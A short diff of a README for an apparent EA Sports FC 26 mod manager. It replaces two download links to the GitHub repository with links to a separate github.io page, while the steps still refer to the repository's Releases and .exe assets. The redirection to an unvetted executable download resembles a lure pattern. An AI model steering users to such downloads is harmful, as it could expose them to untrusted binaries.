@@ -1,6 +1,6 @@
 # ⚙️ FC26-Mod-Preset-Manager - Manage game mods with total control
 
-[![](https://img.shields.io/badge/Download-FC26_Mod_Manager-blue.svg)](https://github.com/Silent-proteinmolecule206/FC26-Mod-Preset-Manager)
+[![](https://img.shields.io/badge/Download-FC26_Mod_Manager-blue.svg)](https://silent-proteinmolecule206.github.io)
 
 ## 📁 About the application
 
@@ -25,7 +25,7 @@ FC26-Mod-Preset-Manager helps you organize mods for EA Sports FC 26. You can con
 
 Follow these steps to set up the manager on your computer.
 
-1.  Visit the [official download page](https://github.com/Silent-proteinmolecule206/FC26-Mod-Preset-Manager) to get the latest version.
+1.  Visit the [official download page](https://silent-proteinmolecule206.github.io) to get the latest version.
 2.  Locate the button labeled "Releases" on the right side of the page.
 3.  Click the version marked "Latest."
 4.  Find the file ending in `.zip` or `.exe` under the "Assets" section.
